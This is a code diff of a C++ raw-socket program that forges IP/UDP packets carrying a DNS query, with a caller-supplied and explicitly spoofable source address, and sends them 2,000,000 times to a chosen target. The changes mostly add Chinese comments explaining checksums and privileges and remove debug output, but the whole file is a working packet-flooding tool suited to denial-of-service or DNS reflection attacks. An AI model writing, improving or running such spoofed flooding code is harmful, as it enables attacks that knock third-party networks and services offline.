@@ -24,16 +24,14 @@ struct UDP_PSD_Header
 	u_int8_t ptcl;
 	u_int16_t len;
 };
+//计算校验和
 unsigned short csum(unsigned short *buf, int nwords)
-{       //
+{ 
 	unsigned long sum;
 	for (sum = 0; nwords > 0; nwords--)
 	{
-		//std::cout << *buf << ' ' << std::endl;
 		sum += *buf++;
 	}
-	//std::cout << std::endl;
-//	std::cout << "sum:" << sum << std::endl;
 	sum = (sum >> 16) + (sum & 0xffff);
 	sum += (sum >> 16);
 	return (unsigned short)(~sum);
@@ -44,7 +42,6 @@ unsigned short csum(unsigned short *buf, int nwords)
 int main(int argc, char *argv[])
 {
 	int sd;
-	// No data/payload just datagram
 	char buffer[PCKT_LEN] ;
 	//查询www.chongfer.cn的DNS报文
 	unsigned char DNS[] = { 0xd8, 0xcb , 0x01, 0x00, 0x00, 0x01, 0x00 ,0x00,
@@ -58,7 +55,7 @@ int main(int argc, char *argv[])
 	struct sockaddr_in sin, din;
 	int  one = 1;
 	const int *val = &one;
-
+	//缓存清零
 	memset(buffer, 0, PCKT_LEN);
 
 	if (argc != 5)
@@ -78,8 +75,8 @@ int main(int argc, char *argv[])
 	}
 	else
 		printf("socket() - Using SOCK_RAW socket and UDP protocol is OK.\n");
-	//if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
-	int nSendBuf = 2048 * 1024;//设置缓冲大小
+	//IPPROTO_TP说明用户自己填写IP报文
+	//IP_HDRINCL表示由内核来计算IP报文的头部校验和，和填充那个IP的id 
 	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(int)))
 	{
 		perror("setsockopt() error");
@@ -103,13 +100,13 @@ int main(int argc, char *argv[])
 	// standard header structures but assign our own values.
 	ip->ihl = 5;
 	ip->version = 4;//报头长度，4*32=128bit=16B
-	ip->tos = 0; // Low delay
+	ip->tos = 0; // 服务类型
 	ip->tot_len = ((sizeof(struct iphdr) + sizeof(struct udphdr)+sizeof(DNS)));
-	ip->id = htons(54321);
-	ip->ttl = 64; // hops
+	//ip->id = htons(54321);//可以不写
+	ip->ttl = 64; // hops生存周期
 	ip->protocol = 17; // UDP
 	ip->check = 0;
-						   // Source IP address, can use spoofed address here!!!
+	// Source IP address, can use spoofed address here!!!
 	ip->saddr = inet_addr(argv[1]);
 	// The destination IP address
 	ip->daddr = inet_addr(argv[3]);
@@ -119,6 +116,8 @@ int main(int argc, char *argv[])
 	// Destination port number
 	udp->dest = htons(atoi(argv[4]));//目的端口
 	udp->len = htons(sizeof(struct udphdr)+sizeof(DNS));//长度
+	//forUDPCheckSum用来计算UDP报文的校验和用
+	//UDP校验和需要计算 伪头部、UDP头部和数据部分
 	char * forUDPCheckSum = new char[sizeof(UDP_PSD_Header) + sizeof(udphdr)+sizeof(DNS)+1];
 	memset(forUDPCheckSum, 0, sizeof(UDP_PSD_Header) + sizeof(udphdr) + sizeof(DNS) + 1);
 	UDP_PSD_Header * udp_psd_Header = (UDP_PSD_Header *)forUDPCheckSum;
@@ -129,36 +128,25 @@ int main(int argc, char *argv[])
 	udp_psd_Header->len = htons(sizeof(udphdr)+sizeof(DNS));
 	memcpy(forUDPCheckSum + sizeof(UDP_PSD_Header), udp, sizeof(udphdr));
 	memcpy(forUDPCheckSum + sizeof(UDP_PSD_Header) + sizeof(udphdr), DNS, sizeof(DNS));
-	std::cout << sizeof(UDP_PSD_Header) << std::endl;
 
-	ip->check = csum((unsigned short *)ip, sizeof(iphdr)/2);
+	//ip->check = csum((unsigned short *)ip, sizeof(iphdr)/2);//可以不用算
+	//计算UDP的校验和，因为报文长度可能为单数，所以计算的时候要补0
 	udp->check = csum((unsigned short *)forUDPCheckSum,(sizeof(udphdr)+sizeof(UDP_PSD_Header)+sizeof(DNS)+1)/2);
 
-	//输出IP报文头
-	setuid(getpid());//权限
-	std::cout <<"IPPocket"<< std::endl;
-	for (size_t i = 0; i < sizeof(iphdr); i++)
-	{
-		std::cout << std::hex << (unsigned int)((unsigned char *)ip)[i] << ' ';
-	}
-	
+	setuid(getpid());//如果不是root用户，需要获取权限	
 
-	// Send loop, send for every 2 second for 100 count
+	// Send loop, send for every 2 second for 2000000 count
 	printf("Trying...\n");
 	printf("Using raw socket and UDP protocol\n");
 	printf("Using Source IP: %s port: %u, Target IP: %s port: %u.\n", argv[1], atoi(argv[2]), argv[3], atoi(argv[4]));
 	std::cout << "Ip length:" << ip->tot_len << std::endl;
 	int count;
+	//将DNS报文拷贝进缓存区
 	memcpy(buffer + sizeof(iphdr) + sizeof(udphdr), DNS, sizeof(DNS));
-	
-	std::cout << "Buffer pocket" << std::endl;
-	for (size_t i = 0; i < sizeof(buffer); i++)
-	{
-		std::cout << std::hex << (unsigned)buffer[i] << ' ';
-	}
 	
 	for (count = 1; count <= 2000000; count++)
 	{
+		
 		if (sendto(sd, buffer, ip->tot_len, 0, (struct sockaddr *)&din, sizeof(din)) < 0)
 			// Verify
 		{
